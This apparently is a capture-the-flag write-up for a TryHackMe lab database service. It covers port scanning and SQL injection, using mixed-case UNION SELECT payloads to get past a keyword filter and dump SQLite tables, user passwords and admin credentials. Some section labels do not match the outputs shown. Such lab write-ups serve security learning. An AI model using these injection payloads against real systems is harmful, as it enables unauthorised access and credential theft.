![intro](Intro.png) 
## Reconnaissance
 
## Mapping and Discovery
```bash
> nmap -sC -sV -p$(nmap --min-rate=1000 -T4 -p- $IP | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//') $IP -oN tcp.txt

Nmap scan report for 10.10.241.159
Host is up (0.30s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 61:c5:06:f2:4a:20:5b:cd:09:4d:72:b0:a5:aa:ce:71 (RSA)
|   256 51:e0:5f:fa:81:64:d3:d9:26:24:16:ca:45:94:c2:00 (ECDSA)
|_  256 77:e1:36:3b:95:9d:e0:3e:0a:56:82:b2:9d:4c:fe:1a (ED25519)
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     Welcome to the Light database!
|     Please enter your username:
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
|     Welcome to the Light database!
|     Please enter your username: Username not found.
|_    Please enter your username:
```
 
## Security Testing
### Vulnerability Identification (sql injection )

```bash
> nc 10.10.241.159 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```
> basic sql payload
```bash
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```
```bash
Please enter your username: SELECT * FROM employees LIMIT 30;
Ahh there is a word in there I don't like :(
```
```bash
Please enter your username: ' or 1=1 limit 1 --
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
Please enter your username: 
```
```bash
Please enter your username: ' OR '1'='1
Password: tF8tj2o94WE4LKC
```
## Obfuscation Techniques to Bypass Filters
> retrieve tablename 
```bash
Please enter your username: ' UniOn SeleCt group_concat(sql) FROM sqlite_master ' 
Password: usertable,admintable
```
```bash
Please enter your username: ' UniOn SeleCt group_concat(sql) FROM sqlite_master ' 
Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER),CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)

```
> retrieve usernames FROM `usertable`
```bash
Please enter your username: ' UniOn SeleCt group_concat(username) FROM usertable '
Password: alice,rob,john,michael,smokey,hazel,ralph,steve
```
> retrieve passwords FROM `usertable`
```bash
Please enter your username: ' UniOn SeleCt group_concat(password) FROM usertable '
Password: tF8tj2o94WE4LKC,yAn4fPaF2qpCKpR,e74tqwRh2oApPo6,7DV4dwA0g5FacRe,vYQ5ngPpw8AdUmL,EcSuU35WlVipjXG,YO1U9O1m52aJImA,WObjufHX1foR8d7
```
> retrieve usernames FROM `admintable`
```bash
Please enter your username: ' UniOn SeleCt group_concat(username) FROM admintable '
Password: mamZtAuMlrsEy5bp6q17,THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```
> retrieve usernames FROM `admintable`
```bash
Please enter your username: ' UniOn SeleCt group_concat(username) FROM admintable '
Password: TryHackMeAdmin,flag
```
### Summary
![alt text](complete.png)
